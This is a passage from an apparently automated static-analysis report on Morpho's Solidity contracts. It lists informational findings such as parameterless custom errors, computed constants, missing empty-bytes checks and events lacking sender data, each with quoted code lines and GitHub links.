[219-220](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L219-L220)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

35:             if (!skipRevert) _revert(returnData);
36:            }

```
[35-36](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L35-L36)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

29:             if (!skipRevert) _revert(returnData);
30:            }

```

[29-30](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L29-L30)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

32:         if (amount == 0) return;
33:    

49:         if (amount == 0) return;
50:    

```

[32-33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L32-L33), [49-50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L49-L50)

```solidity
File: morpho-blue-bundlers/src/UrdBundler.sol

37:             if (!skipRevert) _revert(returnData);
38:            }

```
[37-38](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/UrdBundler.sol#L37-L38)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

31:             if (!skipRevert) _revert(returnData);
32:            }

```

[31-32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L31-L32)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

43:         if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
44:    

```

[43-44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L43-L44)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

40:         if (amount != type(uint256).max) amount = Math.min(amount, ERC20(asset).balanceOf(address(this)));
41:    

```

[40-41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L40-L41)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

51:             if (amount != type(uint256).max) amount = Math.min(amount, ERC20(underlying).balanceOf(address(this)));
52:    

```

[51-52](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L51-L52)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

86:             if (!skipRevert) _revert(returnData);
87:            }

```

[86-87](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L86-L87)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

67:     constructor(
68:            address morpho,

```

[67-68](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L67-L68)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

21:         if (address(feed) == address(0)) return 1;
22:    

32:         if (address(feed) == address(0)) return 0;
33:    

```

[21-22](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L21-L22), [32-33](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L32-L33)




### Custom error has no error details

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Consider adding parameters to the error to indicate which user or values caused the failure

*Instances (20)*:

```solidity
File: metamorpho/src/libraries/ErrorsLib.sol

12:     error ZeroAddress();

15:     error NotCuratorRole();

18:     error NotAllocatorRole();

21:     error NotGuardianRole();

24:     error NotCuratorNorGuardianRole();

37:     error MaxFeeExceeded();

40:     error AlreadySet();

43:     error AlreadyPending();

58:     error NoPendingValue();

61:     error NotEnoughLiquidity();

64:     error MarketNotCreated();

67:     error MarketNotEnabled();

70:     error AboveMaxTimelock();

73:     error BelowMinTimelock();

76:     error TimelockNotElapsed();

79:     error MaxQueueLengthExceeded();

82:     error ZeroFeeRecipient();

85:     error InconsistentReallocation();

88:     error AllCapsReached();

```

[12](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L12), [15](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L15), [18](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L18), [21](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L21), [24](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L24), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L37), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L40), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L43), [58](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L58), [61](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L61), [64](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L64), [67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L67), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L70), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L73), [76](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L76), [79](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L79), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L82), [85](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L85), [88](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L88)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

19:     error BadSignatory();

```

[19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L19)




### Do not calculate constants

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

Due to how constant variables are implemented (replacements at compile-time), an expression assigned to a constant variable is recomputed each time that the variable is used, which wastes some gas.

*Instances (1)*:

```solidity
File: morpho-blue/src/libraries/MarketParamsLib.sol

13:     uint256 internal constant MARKET_PARAMS_BYTES_LENGTH = 5 * 32;

```

[13](https://github.com/morpho-org/morpho-blue/tree/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/libraries/MarketParamsLib.sol#L13)




### Empty `bytes` check is missing

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

When developing smart contracts in Solidity, it's crucial to validate the inputs of your functions. This includes ensuring that the bytes parameters are not empty, especially when they represent crucial data such as addresses, identifiers, or raw data that the contract needs to process.
 Missing empty bytes checks can lead to unexpected behaviour in your contract. For instance,   certain operations might fail, produce incorrect results, or consume unnecessary gas when performed with empty bytes. Moreover, missing input validation can potentially expose your contract to malicious activity, including exploitation of unhandled edge cases.
 To mitigate these issues, always validate that bytes parameters are not empty when the logic of your contract requires it.

*Instances (30)*:


```solidity
File: metamorpho/src/MetaMorphoFactory.sol

/// @audit salt
43:     function createMetaMorpho(
44:            address initialOwner,
45:            uint256 initialTimelock,
46:            address asset,
47:            string memory name,
48:            string memory symbol,
49:            bytes32 salt
50:        ) external returns (MetaMorpho metaMorpho) {

```

[43-50](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L43-L50)


```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit data
34:     function onMorphoSupply(uint256, bytes calldata data) external {

/// @audit data
39:     function onMorphoSupplyCollateral(uint256, bytes calldata data) external {

/// @audit data
44:     function onMorphoRepay(uint256, bytes calldata data) external {

/// @audit data
49:     function onMorphoLiquidate(uint256, bytes calldata data) external {

/// @audit data
54:     function onMorphoFlashLoan(uint256, bytes calldata data) external {

/// @audit data
90:     function morphoSupply(
91:            MarketParams calldata marketParams,
92:            uint256 assets,
93:            uint256 shares,
94:            uint256 slippageAmount,
95:            address onBehalf,
96:            bytes calldata data
97:        ) external payable protected {

/// @audit data
120:     function morphoSupplyCollateral(
121:             MarketParams calldata marketParams,
122:             uint256 assets,
123:             address onBehalf,
124:             bytes calldata data
125:         ) external payable protected {

/// @audit data
174:     function morphoRepay(
175:             MarketParams calldata marketParams,
176:             uint256 assets,
177:             uint256 shares,
178:             uint256 slippageAmount,
179:             address onBehalf,
180:             bytes calldata data
181:         ) external payable protected {

/// @audit data
244:     function morphoLiquidate(
245:             MarketParams calldata marketParams,
246:             address borrower,
247:             uint256 seizedAssets,
248:             uint256 repaidShares,
249:             uint256 maxRepaidAssets,
250:             bytes memory data
251:         ) external payable protected {

/// @audit data
263:     function morphoFlashLoan(address token, uint256 assets, bytes calldata data) external payable protected {

/// @audit data
272:     function _callback(bytes calldata data) internal {

```

[34](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L34), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L39), [44](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L44), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L49), [54](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L54), [90-97](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L90-L97), [120-125](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L120-L125), [174-181](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L174-L181), [244-251](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L244-L251), [263](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L263), [272](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L272)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit signature
28:     function approve2(IAllowanceTransfer.PermitSingle calldata permitSingle, bytes calldata signature, bool skipRevert)
29:            external
30:            payable
31:            protected
32:        {

```

[28-32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L28-L32)

```solidity
File: morpho-blue-bundlers/src/PermitBundler.sol

/// @audit r
22:     function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
23:            external
24:            payable
25:            protected
26:        {

/// @audit s
22:     function permit(address asset, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
23:            external
24:            payable
25:            protected
26:        {

```

[22-26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22-L26), [22-26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22-L26)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

/// @audit r
24:     function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
25:            external
26:            payable
27:            protected
28:        {

/// @audit s
24:     function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert)
25:            external
26:            payable
27:            protected
28:        {

```

[24-28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L24-L28), [24-28](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L24-L28)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit r
74:     function compoundV3AllowBySig(
75:            address instance,
76:            bool isAllowed,
77:            uint256 nonce,
78:            uint256 expiry,
79:            uint8 v,
80:            bytes32 r,
81:            bytes32 s,
82:            bool skipRevert
83:        ) external payable protected {

/// @audit s
74:     function compoundV3AllowBySig(
75:            address instance,
76:            bool isAllowed,
77:            uint256 nonce,
78:            uint256 expiry,
79:            uint8 v,
80:            bytes32 r,
81:            bytes32 s,
82:            bool skipRevert
83:        ) external payable protected {

```

[74-83](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L74-L83), [74-83](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L74-L83)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit initialRoot
68:     constructor(address initialOwner, uint256 initialTimelock, bytes32 initialRoot, bytes32 initialIpfsHash) {

/// @audit initialIpfsHash
68:     constructor(address initialOwner, uint256 initialTimelock, bytes32 initialRoot, bytes32 initialIpfsHash) {

/// @audit newRoot
80:     function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

/// @audit newIpfsHash
80:     function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

/// @audit newRoot
143:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

/// @audit newIpfsHash
143:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {

/// @audit newRoot
183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal {

/// @audit newIpfsHash
183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal {

```

[68](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L68), [68](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L68), [80](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L80), [80](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L80), [143](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143), [143](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143), [183](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183), [183](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183)

```solidity
File: universal-rewards-distributor/src/UrdFactory.sol

/// @audit initialRoot
26:     function createUrd(
27:            address initialOwner,
28:            uint256 initialTimelock,
29:            bytes32 initialRoot,
30:            bytes32 initialIpfsHash,
31:            bytes32 salt
32:        ) public returns (UniversalRewardsDistributor urd) {

/// @audit initialIpfsHash
26:     function createUrd(
27:            address initialOwner,
28:            uint256 initialTimelock,
29:            bytes32 initialRoot,
30:            bytes32 initialIpfsHash,
31:            bytes32 salt
32:        ) public returns (UniversalRewardsDistributor urd) {

/// @audit salt
26:     function createUrd(
27:            address initialOwner,
28:            uint256 initialTimelock,
29:            bytes32 initialRoot,
30:            bytes32 initialIpfsHash,
31:            bytes32 salt
32:        ) public returns (UniversalRewardsDistributor urd) {

```

[26-32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26-L32), [26-32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26-L32), [26-32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26-L32)




### Events are missing sender information

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

When an action is triggered based on a user's action, not being able to filter based on who triggered the action makes event processing a lot more cumbersome. Including the `msg.sender` the events of these types of action will make events much more useful to end users.

*Instances (29)*:


```solidity
File: metamorpho/src/MetaMorpho.sol

191:         emit EventsLib.SetCurator(newCurator);

200:         emit EventsLib.SetIsAllocator(newAllocator, newIsAllocator);

209:         emit EventsLib.SetSkimRecipient(newSkimRecipient);

228:             emit EventsLib.SubmitTimelock(newTimelock);

244:         emit EventsLib.SetFee(_msgSender(), fee);

257:         emit EventsLib.SetFeeRecipient(newFeeRecipient);

277:             emit EventsLib.SubmitGuardian(newGuardian);

302:             emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap);

317:         emit EventsLib.SubmitMarketRemoval(_msgSender(), id);

336:         emit EventsLib.SetSupplyQueue(_msgSender(), newSupplyQueue);

384:         emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);

420:                 emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

439:                 emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

456:         emit EventsLib.RevokePendingTimelock(_msgSender());

465:         emit EventsLib.RevokePendingGuardian(_msgSender());

474:         emit EventsLib.RevokePendingCap(_msgSender(), id);

481:         emit EventsLib.RevokePendingMarketRemoval(_msgSender(), id);

520:         emit EventsLib.Skim(_msgSender(), token, amount);

751:         emit EventsLib.SetTimelock(_msgSender(), newTimelock);

760:         emit EventsLib.SetGuardian(_msgSender(), newGuardian);

789:         emit EventsLib.SetCap(_msgSender(), id, supplyCap);

898:         emit EventsLib.UpdateLastTotalAssets(updatedTotalAssets);

909:         emit EventsLib.AccrueInterest(newTotalAssets, feeShares);

```

[191](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L191), [200](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L200), [209](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L209), [228](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L228), [244](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L244), [257](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L257), [277](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L277), [302](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L302), [317](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L317), [336](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L336), [384](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L384), [420](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L420), [439](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L439), [456](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L456), [465](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L465), [474](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L474), [481](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L481), [520](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L520), [751](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L751), [760](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L760), [789](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L789), [898](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L898), [909](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L909)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

110:         emit BorrowRateUpdate(id, avgRate, uint256(endRateAtTarget));

```

[110](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L110)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

135:         emit EventsLib.Claimed(account, reward, amount);

168:         emit EventsLib.RootUpdaterSet(updater, active);

189:         emit EventsLib.RootSet(newRoot, newIpfsHash);

196:         emit EventsLib.OwnerSet(newOwner);

203:         emit EventsLib.TimelockSet(newTimelock);

```

[135](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L135), [168](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L168), [189](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L189), [196](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L196), [203](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L203)



### Events should be emitted when critical changes are made to the contracts.

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

*Instances (26)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

66:     function _update(address from, address to, uint256 value) internal virtual override {
67:            if (!hasPermission(from)) revert NoPermission(from);
68:            if (!hasPermission(to)) revert NoPermission(to);
69:    
70:            super._update(from, to, value);
71:        }

```

[66-71](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L66-L71)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

67:     function setIsAllocator(address newAllocator, bool newIsAllocator) external;

68:     function setCurator(address newCurator) external;

69:     function setFee(uint256 newFee) external;

70:     function setFeeRecipient(address newFeeRecipient) external;

71:     function setSkimRecipient(address) external;

73:     function setSupplyQueue(Id[] calldata newSupplyQueue) external;

74:     function updateWithdrawQueue(uint256[] calldata indexes) external;

```

[67](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L67), [68](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L68), [69](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L69), [70](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L70), [71](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L71), [73](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L73), [74](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L74)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

65:     function morphoSetAuthorizationWithSig(
66:            Authorization calldata authorization,
67:            Signature calldata signature,
68:            bool skipRevert
69:        ) external payable protected {
70:            try MORPHO.setAuthorizationWithSig(authorization, signature) {}
71:            catch (bytes memory returnData) {
72:                if (!skipRevert) _revert(returnData);
73:            }
74:        }

```

[65-74](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L65-L74)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

133:     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external;

219:     function setConfiguration(address reserve, uint256 configuration) external;

256:     function setPause(bool val) external;

```

[133](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L133), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

235:     function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;

358:     function setReserveInterestRateStrategyAddress(address asset, address rateStrategyAddress) external;

432:     function updateBridgeProtocolFee(uint256 bridgeProtocolFee) external;

444:     function updateFlashloanPremiums(uint128 flashLoanPremiumTotal, uint128 flashLoanPremiumToProtocol) external;

450:     function setUserEMode(uint8 categoryId) external;

464:     function resetIsolationModeTotalDebt(address asset) external;

```

[235](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L235), [358](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L358), [432](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L432), [444](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L444), [450](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L450), [464](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L464)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

143:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
144:             require(newRoot != root || newIpfsHash != ipfsHash, ErrorsLib.ALREADY_SET);
145:             require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);
146:     
147:             _setRoot(newRoot, newIpfsHash);
148:         }

154:     function setTimelock(uint256 newTimelock) external onlyOwner {
